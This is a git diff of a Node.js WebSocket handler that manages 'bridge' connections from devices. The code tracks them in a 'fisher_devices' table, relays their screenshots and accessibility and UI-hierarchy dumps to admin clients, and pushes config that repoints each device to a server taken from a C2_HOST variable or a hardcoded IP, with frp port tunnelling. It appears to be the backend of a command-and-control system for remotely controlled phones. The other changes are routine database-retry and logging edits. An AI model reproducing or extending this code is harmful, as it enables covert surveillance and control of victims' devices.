@@ -1,75 +1,38 @@
 'use strict';
 
-const {
-  broadcastToAdmins,
-  forwardFrameToAdmins,
-  isHighVolumeMessage,
-  hasStreamConsumers,
-  streamModeForMessage,
-  recordInboundStream,
-  recordNoSubscriberDrop,
-  clearDeviceFrameState,
-} = require('./admin');
-const { getPool } = require('../services/commandPoller');
+const { broadcastToAdmins, forwardFrameToAdmins } = require('./admin');
+const { getPool, dbWithRetry } = require('../services/commandPoller');
+const { allowWrite: wtAllow, markWritten: wtMark } = require('../services/writeThrottle');
+const { isDeviceDeleted } = require('../services/deletedDevices');
 const config = require('../../config');
 
-const SCREEN_PREFIX = /["'](?:type|event|messageType)["']\s*:\s*["'](?:screenshot|screen|frame|screen_frame)["']/i;
-const READER_PREFIX = /["'](?:type|event|messageType)["']\s*:\s*["'](?:ui_hierarchy|accessibility_data|accessibility_dump|reader_data)["']/i;
-
-function getBridgeBootstrapServerUrl() {
-  const explicit = String(
-    process.env.DEVICE_BOOTSTRAP_SERVER_URL ||
-    process.env.C2_HOST ||
-    process.env.APP_SERVER_URL ||
-    ''
-  ).trim();
-  if (explicit) return explicit.replace(/\/+$/, '');
-
-  const host = String(config.external?.host || config.frps?.addr || '127.0.0.1').trim();
-  const port = Number(config.external?.port || config.port || 8889);
-  const defaultPort = port === 80 || port === 443;
-  const scheme = port === 443 ? 'https' : 'http';
-  return `${scheme}://${host}${defaultPort ? '' : `:${port}`}`.replace(/\/+$/, '');
-}
-
-function hostPortFromServerUrl(serverUrl) {
-  try {
-    return new URL(serverUrl).host;
-  } catch {
-    return serverUrl.replace(/^https?:\/\//i, '').replace(/\/+$/, '');
+function getServerAddr() {
+  const raw = String(process.env.C2_HOST || process.env.SERVER_ADDR || '').trim();
+  if (raw) {
+    return raw
+      .replace(/^https?:\/\//i, '')
+      .replace(/^wss?:\/\//i, '')
+      .replace(/\/.*$/, '');
   }
-}
-
-function dropUnsubscribedStreamBuffer(buf, deviceId, connections) {
-  const prefix = buf.subarray(0, Math.min(buf.length, 2048)).toString('utf8');
-  const mode = SCREEN_PREFIX.test(prefix) ? 'screen_capture' : (READER_PREFIX.test(prefix) ? 'reader' : '');
-  if (!mode || hasStreamConsumers(connections, deviceId, mode)) return false;
-  recordInboundStream(connections, buf.length);
-  recordNoSubscriberDrop(connections, buf.length);
-  return true;
-}
-
-function acceptParsedBridgeMessage(msg, bytes, deviceId, connections) {
-  if (!isHighVolumeMessage(msg)) return true;
-  recordInboundStream(connections, bytes);
-  if (hasStreamConsumers(connections, deviceId, streamModeForMessage(msg))) return true;
-  recordNoSubscriberDrop(connections, bytes);
-  return false;
+  const host = config.frps.addr || process.env.EXTERNAL_HOST || '154.94.224.239';
+  const port = config.port || process.env.EXTERNAL_PORT || 8889;
+  return `${host}:${port}`;
 }
 
 /**
  * local-service Bridge WebSocket handler
  * 路径: /ws/bridge?deviceId=xxx
  */
-function handleBridge(ws, deviceId, connections) {
-  const connectedAt = new Date().toISOString();
-  const previousConnection = connections.bridges.get(deviceId);
-  connections.bridges.set(deviceId, { ws, deviceId, connectedAt, lastActivity: Date.now() });
-  if (previousConnection?.ws && previousConnection.ws !== ws) {
-    console.warn(`[WS-Bridge] replacing stale connection device=${deviceId}`);
-    try { previousConnection.ws.terminate(); } catch {}
-  }
-  console.log(`[WS-Bridge] connected device=${deviceId} at=${connectedAt}`);
+async function handleBridge(ws, deviceId, connections) {
+  try {
+    if (await isDeviceDeleted(getPool(), deviceId)) {
+      console.log(`[WS-Bridge] Reject deleted device: ${deviceId}`);
+      try { ws.close(4004, 'Device deleted'); } catch (e) {}
+      return;
+    }
+  } catch (e) {}
+  connections.bridges.set(deviceId, { ws, deviceId, lastActivity: Date.now() });
+  console.log(`[WS-Bridge] Connected: ${deviceId}`);
 
   // 更新数据库：设备上线 + local_service_connected
   updateBridgeStatus(deviceId, true);
@@ -80,22 +43,19 @@ function handleBridge(ws, deviceId, connections) {
   }).catch(e => console.error(`[WS-Bridge] pre-allocate port ERROR for ${deviceId.substring(0, 12)}...: ${e.message}`));
 
   // ★ AUTO-FIX: Bridge 连接后立即配置 local-service（与旧 Python 后端一致）
-  const serverUrl = getBridgeBootstrapServerUrl();
-  const serverHost = hostPortFromServerUrl(serverUrl);
-  const bridgeUrl = serverUrl.replace(/^http:/i, 'ws:').replace(/^https:/i, 'wss:')
-    + `/ws/bridge?deviceId=${encodeURIComponent(deviceId)}`;
+  const SERVER_ADDR = getServerAddr();
   const fixCommands = [
     // ★ 已移除 localAdbConnect：避免每次 Bridge 连上自动开启 ADB
     // 需要开 ADB 时，通过前端 /api/device/adb-wifi 接口手动启用
     { command: 'scanDebugPort' },
     // ★ 推送 deviceId + serverAddr 到设备 conf（核心：解决设备不传 deviceId 问题）
-    { command: 'setAppConfig', params: { deviceId: deviceId, serverAddr: serverUrl } },
-    { command: 'syncMainServerHost', params: { serverHost, host: serverHost } },
-    { command: 'setConfig', params: { serverAddr: serverUrl, serverHost, deviceId: deviceId, bridgeUrl } },
+    { command: 'setAppConfig', params: { deviceId: deviceId, serverAddr: `http://${SERVER_ADDR}` } },
+    { command: 'syncMainServerHost', params: { serverHost: SERVER_ADDR, host: SERVER_ADDR } },
+    { command: 'setConfig', params: { serverAddr: SERVER_ADDR, serverHost: SERVER_ADDR, deviceId: deviceId, bridgeUrl: `ws://${SERVER_ADDR}/ws/bridge?deviceId=${deviceId}` } },
     { command: 'saveConfig' },
     { command: 'forceSync' },
     // ★ 触发 Go 重新 fetchFrpcConfigFromServer（带 deviceId），获取正确的 remote_port
-    { command: 'setServerAddr', params: { serverAddr: serverUrl } },
+    { command: 'setServerAddr', params: { serverAddr: `http://${SERVER_ADDR}` } },
   ];
 
   let delay = 1000;
@@ -161,24 +121,16 @@ function handleBridge(ws, deviceId, connections) {
     try {
       // 每次收到消息都标记活跃
       const conn = connections.bridges.get(deviceId);
-      if (!conn || conn.ws !== ws) {
-        console.warn(`[WS-Bridge] stale message ignored device=${deviceId}`);
-        return;
-      }
       if (conn) conn.lastActivity = Date.now();
       // 尝试将 Buffer 解析为 JSON（bridge 可能以二进制帧发送 JSON 响应）
       if (Buffer.isBuffer(data) || data instanceof ArrayBuffer) {
         const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
-        if (dropUnsubscribedStreamBuffer(buf, deviceId, connections)) return;
         // 检查是否以 '{' 或 '[' 开头（JSON）
         if (buf.length > 0 && (buf[0] === 0x7b || buf[0] === 0x5b)) {
           try {
             const str = buf.toString('utf8');
             const msg = JSON.parse(str);
-            if (!acceptParsedBridgeMessage(msg, buf.length, deviceId, connections)) return;
-            if (!isHighVolumeMessage(msg) && !['heartbeat', 'ping'].includes(msg.type)) {
-              console.log(`[WS-Bridge] message device=${deviceId} type=${msg.type || msg.event || 'unknown'}`);
-            }
+            console.log(`[WS-Bridge] <<<< Received JSON from ${deviceId}:`, str.substring(0, 200));
             handleBridgeMessage(ws, msg, deviceId, connections);
             return;
           } catch {}
@@ -189,12 +141,8 @@ function handleBridge(ws, deviceId, connections) {
       }
 
       try {
-        const text = data.toString();
-        const msg = JSON.parse(text);
-        if (!acceptParsedBridgeMessage(msg, Buffer.byteLength(text), deviceId, connections)) return;
-        if (!isHighVolumeMessage(msg) && !['heartbeat', 'ping'].includes(msg.type)) {
-          console.log(`[WS-Bridge] message device=${deviceId} type=${msg.type || msg.event || 'unknown'}`);
-        }
+        const msg = JSON.parse(data.toString());
+        console.log(`[WS-Bridge] <<<< Received from ${deviceId}:`, JSON.stringify(msg).substring(0, 200));
         handleBridgeMessage(ws, msg, deviceId, connections);
       } catch (err) {
         console.error(`[WS-Bridge] Parse error from ${deviceId}:`, err.message);
@@ -216,7 +164,6 @@ function handleBridge(ws, deviceId, connections) {
     clearInterval(serverPingInterval);
     if (!isCurrentBridgeConnection()) return;  // ★ 归属校验，被新连接覆盖则不清理
     connections.bridges.delete(deviceId);
-    clearDeviceFrameState(deviceId);
     // 只有当没有 device WS 连接时才标记设备为离线
     const hasDeviceWs = connections.devices.has(deviceId);
     updateBridgeStatus(deviceId, false, hasDeviceWs);
@@ -226,7 +173,7 @@ function handleBridge(ws, deviceId, connections) {
       data: { localServiceConnected: false, status: hasDeviceWs ? 'online' : 'offline' },
     });
     broadcastToAdmins(connections, { type: 'device_update' });
-    console.log(`[WS-Bridge] disconnected device=${deviceId} at=${new Date().toISOString()}`);
+    console.log(`[WS-Bridge] Disconnected: ${deviceId}`);
   });
 
   ws.on('error', () => {
@@ -234,7 +181,6 @@ function handleBridge(ws, deviceId, connections) {
     clearInterval(serverPingInterval);
     if (!isCurrentBridgeConnection()) return;  // ★ 归属校验，同上
     connections.bridges.delete(deviceId);
-    clearDeviceFrameState(deviceId);
     const hasDeviceWs = connections.devices.has(deviceId);
     updateBridgeStatus(deviceId, false, hasDeviceWs);
   });
@@ -242,71 +188,96 @@ function handleBridge(ws, deviceId, connections) {
 
 /**
  * 更新 bridge 连接/断开状态
+ * ★ 2026-09-03 死锁修复：
+ *   - 所有 UPDATE 走 dbWithRetry 自动重试
+ *   - 上线 UPDATE 前走 writeThrottle（last_seen/public_ip 10s 内已刷则跳过）
+ *   - 死锁类异常降级为 warn，不打 error 避免日志爆炸
  */
 async function updateBridgeStatus(deviceId, connected, hasOtherConnection = false) {
   try {
     const db = getPool();
     const now = Math.floor(Date.now() / 1000);
+    const shortId = String(deviceId).substring(0, 12);
     if (connected) {
-      await db.query(
-        'UPDATE fisher_devices SET is_connected=1, local_service_connected=1, last_seen=?, connected_at=? WHERE device_id=?',
-        [now, now, deviceId]
+      // bridge 上线：只在 10s 窗口内未刷过 last_seen 时才写，避免与 device WS 心跳抢锁
+      const needLastSeen = wtAllow(deviceId, 'last_seen');
+      const setParts = ['is_connected=1', 'local_service_connected=1', 'connected_at=?'];
+      const params = [now];
+      if (needLastSeen) { setParts.push('last_seen=?'); params.push(now); }
+      params.push(deviceId);
+      await dbWithRetry(
+        () => db.query(`UPDATE fisher_devices SET ${setParts.join(',')} WHERE device_id=?`, params),
+        { label: `BridgeStatus:ON:${shortId}`, maxRetries: 3 }
       );
+      if (needLastSeen) wtMark(deviceId, 'last_seen');
     } else {
       if (hasOtherConnection) {
         // 还有其他连接（device WS），只标记 local_service_connected=0
-        await db.query(
-          'UPDATE fisher_devices SET local_service_connected=0 WHERE device_id=?',
-          [deviceId]
+        await dbWithRetry(
+          () => db.query(
+            'UPDATE fisher_devices SET local_service_connected=0 WHERE device_id=?',
+            [deviceId]
+          ),
+          { label: `BridgeStatus:LOCAL_OFF:${shortId}`, maxRetries: 3 }
         );
       } else {
         // 无任何连接 → 离线
-        await db.query(
-          'UPDATE fisher_devices SET local_service_connected=0, is_connected=0 WHERE device_id=?',
-          [deviceId]
+        await dbWithRetry(
+          () => db.query(
+            'UPDATE fisher_devices SET local_service_connected=0, is_connected=0 WHERE device_id=?',
+            [deviceId]
+          ),
+          { label: `BridgeStatus:OFF:${shortId}`, maxRetries: 3 }
         );
       }
     }
   } catch (err) {
-    console.error('[WS-Bridge] DB error:', err.message);
+    if (/Deadlock found|Lock wait timeout/i.test(err.message || '')) {
+      console.warn(`[WS-Bridge] BridgeStatus give up (${shortId}...): ${err.message}`);
+    } else {
+      console.error('[WS-Bridge] DB error:', err.message);
+    }
   }
 }
 
 /**
  * 更新 last_seen（定时心跳）
+ * ★ 2026-09-03 死锁修复：
+ *   - 先过 writeThrottle：10s 内 device WS / syncDeviceStatus / bridge 任意一个刷过 last_seen 就跳过
+ *   - dbWithRetry 兜底自动重试
  */
 async function updateLastSeen(deviceId) {
   try {
+    // 内存去抖：10 秒内重复心跳直接跳过（最有效的减锁手段）
+    if (!wtAllow(deviceId, 'last_seen')) return;
     const db = getPool();
     const now = Math.floor(Date.now() / 1000);
-    await db.query('UPDATE fisher_devices SET last_seen=? WHERE device_id=?', [now, deviceId]);
+    await dbWithRetry(
+      () => db.query('UPDATE fisher_devices SET last_seen=? WHERE device_id=?', [now, deviceId]),
+      { label: `Bridge:lastSeen:${String(deviceId).substring(0, 8)}`, maxRetries: 2 }
+    );
   } catch (err) {
-    console.error('[WS-Bridge] updateLastSeen error:', err.message);
+    if (/Deadlock found|Lock wait timeout/i.test(err.message || '')) {
+      // 静默：下一个心跳 tick（30s 后）自然会再次尝试（到那时 10s 去抖窗口也过了）
+    } else {
+      console.error('[WS-Bridge] updateLastSeen error:', err.message);
+    }
   }
 }
 
 function handleBridgeMessage(ws, msg, deviceId, connections) {
   const { type } = msg;
-  const highVolume = isHighVolumeMessage(msg);
-  if (!highVolume && !['heartbeat', 'ping'].includes(type)) {
-    console.log(`[WS-Bridge] handle device=${deviceId} type=${type || 'unknown'}`);
-  }
+  console.log(`[WS-Bridge] handleBridgeMessage type='${type}' from ${deviceId}`);
 
   switch (type) {
     case 'command_result':
       // 命令执行结果
-      const commandName = String(msg.data?.command || msg.data?.requestCommand || msg.data?.originalCommand || msg.command || 'unknown');
-      if (!highVolume) {
-        console.log(`[WS-Reply] bridge=${deviceId} type=command_result command=${commandName}`);
-      }
-      const delivered = broadcastToAdmins(connections, {
+      console.log(`[WS-Bridge] >>>> Forwarding command_result to admins from ${deviceId}:`, JSON.stringify(msg.data || msg).substring(0, 200));
+      broadcastToAdmins(connections, {
         type: 'command_result',
         deviceId,
         data: msg.data || msg,
       });
-      if (!highVolume) {
-        console.log(`[WS-Reply] bridge=${deviceId} command=${commandName} delivered=${delivered}`);
-      }
       break;
 
     case 'screenshot':
@@ -327,9 +298,7 @@ function handleBridgeMessage(ws, msg, deviceId, connections) {
 
     default:
       // 透传给管理端
-      if (!highVolume && type !== 'ping') {
-        console.log(`[WS-Bridge] >>>> Forwarding default msg to admins from ${deviceId}: type='${type}'`);
-      }
+      console.log(`[WS-Bridge] >>>> Forwarding default msg to admins from ${deviceId}: type='${type}'`);
       broadcastToAdmins(connections, { ...msg, deviceId });
   }
 }
